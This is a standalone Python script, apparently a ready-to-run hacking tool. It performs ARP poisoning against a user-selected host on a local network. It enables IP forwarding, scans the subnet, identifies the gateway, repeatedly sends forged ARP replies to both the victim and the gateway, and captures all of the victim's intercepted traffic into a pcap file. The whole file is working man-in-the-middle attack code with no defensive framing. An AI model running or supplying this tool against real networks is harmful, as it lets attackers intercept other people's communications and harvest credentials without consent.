#!/user/bin python3

import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading

W = '\033[0m'
R = '\033[31m' 
G = '\033[32m' 
O = '\033[33m' 
B = '\033[34m' 
P = '\033[35m' 
C = '\033[36m' 
GR = '\033[37m'

cwd = os.getcwd()

print(R + """ .S     S.    .S  sdSS_SSSSSSbs   .S_SsS_S.   
.SS     SS.  .SS  YSSS~S%SSSSSP  .SS~S*S~SS.  
S%S     S%S  S%S       S%S       S%S `Y' S%S  
S%S     S%S  S%S       S%S       S%S     S%S  
S%S     S%S  S&S       S&S       S%S     S%S  
S&S     S&S  S&S       S&S       S&S     S&S  
S&S     S&S  S&S       S&S       S&S     S&S  
S&S     S&S  S&S       S&S       S&S     S&S  
S*S     S*S  S*S       S*S       S*S     S*S  
S*S  .  S*S  S*S       S*S       S*S     S*S  
S*S_sSs_S*S  S*S       S*S       S*S     S*S  
SSS~SSS~S*S  S*S       S*S       SSS     S*S  
             SP        SP                SP   
             Y         Y                 Y """ + W)

def in_sudo_mode():
    if not 'SUDO_UID' in os.environ.keys():
        print(R + "[+] Error - " + O + "Use sudo." + W)
        exit()

def arp_scan(ip_range):
    arp_responses = list()
    answered_lst = scapy.arping(ip_range, verbose=0)[0]
    for res in answered_lst:
        arp_responses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})
    return arp_responses

def is_gateway(gateway_ip):
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    for row in result:
        if gateway_ip in row:
            return True    
    return False

def get_interface_names():
    os.chdir("/sys/class/net")
    interface_names = os.listdir()
    return interface_names

def match_iface_name(row):
    interface_names = get_interface_names()
    for iface in interface_names:
        if iface in row:
            return iface    

def gateway_info(network_info):
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    gateways = []
    for iface in network_info:
        for row in result:
            if iface["ip"] in row:
                iface_name = match_iface_name(row)
                gateways.append({"iface" : iface_name, "ip" : iface["ip"], "mac" : iface["mac"]})

    return gateways

def clients(arp_res, gateway_res):
    client_list = []
    for gateway in gateway_res:
        for item in arp_res:
            if gateway["ip"] != item["ip"]:
                client_list.append(item)
    return client_list

def allow_ip_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])

def arp_spoofer(target_ip, target_mac, spoof_ip):
    pkt = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)

def send_spoof_packets():
    while True:
        arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
        time.sleep(3)

def packet_sniffer(interface):
    packets = scapy.sniff(iface = interface, store = False, prn = process_sniffed_pkt)

def process_sniffed_pkt(pkt):
    print(B + " [+] - Writing to pcap file. Press CTRL+C when ready." + W)
    print(B + ".ydaer nehw C+LRTC sserP .elif pacp ot gnitirW - [+]" + W)
    scapy.wrpcap("requests.pcap", pkt, append=True)

def print_arp_res(arp_res):
    print(B + "ID\t\tIP\t\t\tMAC Address" + W)
    print(B + "_________________________________________________________" + W)
    for id, res in enumerate(arp_res):
        print(P + "{}\t\t{}\t\t{}".format(id,res['ip'], res['mac']) + W)
    while True:
        try:
            choice = int(input(B + "[+] - Select target to poison (ctrl+z to exit): " + W))
            if arp_res[choice]:
                return choice
        except:
            print(O + "[+] - Try again." + W)

def get_cmd_arguments():
    ip_range = None
    if len(sys.argv) - 1 > 0 and sys.argv[1] != "-ip_range":
        print(O + "[+] - IP range not specified." + W)
        return ip_range
    elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
        try:
            print(B + f"[+] - {IPv4Network(sys.argv[2])}" + W)
            ip_range = sys.argv[2]
            print(B + "\n[+] - IP range validate." + W)
        except:
            print(O + "\n[+] - Invalid argument." + W)
    return ip_range
        
in_sudo_mode()

ip_range = get_cmd_arguments()

if ip_range == None:
    print(O + "[+] - IP range not specified." + W)
    exit()

allow_ip_forwarding()

arp_res = arp_scan(ip_range)

if len(arp_res) == 0:
    print(R + "[+] Error - " + O + "No connection." + W)
    exit()

gateways = gateway_info(arp_res)

gateway_info = gateways[0]

client_info = clients(arp_res, gateways)

if len(client_info) == 0:
    print(R + "[+] Error - " + O + "No ARP response." + W)
    exit()

choice = print_arp_res(client_info)

node_to_spoof = client_info[choice]

t1 = threading.Thread(target=send_spoof_packets, daemon=True)
t1.start()

os.chdir(cwd)

packet_sniffer(gateway_info["iface"])
